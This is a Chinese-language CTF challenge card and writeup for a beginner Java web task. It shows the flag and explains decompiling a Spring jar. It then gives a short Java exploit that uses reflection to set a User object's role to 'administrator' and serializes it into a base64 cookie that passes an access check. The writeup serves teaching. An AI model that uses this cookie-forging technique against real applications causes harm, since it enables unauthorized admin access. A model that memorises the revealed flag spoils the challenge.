- **题目名称：** Learn_decompilation_and_reflection
- **题目类型：** WEB
- **题目难度：** 简单
- **出题人：** Victor
- **考点：**

1. 对jar包的反编译和简单的spring代码审计
2. 反射、简单的序列化和反序列化、简单的java代码编写

- **描述：** 简单学习一下java的基础知识吧
- **flag：** XSCTF{Th3n_y0u_can_le4rn_m0re_ab0ut_j4v4_s3curity}
- **Writeup：** 

建议先学习一下java中的反射、序列化、反序列化在现实中的作用以及可能导致的安全问题和利用方式
拿到jar包以后反编译，pom.xml和其他配置文件都没什么有用的东西。
直接审计路由。只需要在CheckPrivilege路由通过json提交challenge参数，然后在cookie反序列化user类时通过if判断即可得到flag。
将user类的代码复制到本地，或者直接把整个项目当成外部lib即可导入user类。
通过反射的方法设置role属性为管理员（实际上该情况下不通过反射直接设置也可以，但实战中大都需要反射才能做类似的操作），序列化后base64编码即可通过if判断，exp如下：

```
package com.xsctf.ldar.Bean;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;

public class exp {
    public static void main(String[] args) throws Exception{
        User user =new User();
        Class cls = user.getClass();
        Field role = cls.getDeclaredField("role");
        role.setAccessible(true);
        role.set(user,"administrator");
        System.out.println(serialize(user));
    }
    public static String serialize(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
        oos.writeObject(obj);
        byte[] serializedBytes = byteArrayOutputStream.toByteArray();
        return Base64.getEncoder().encodeToString(serializedBytes);
    }
}

```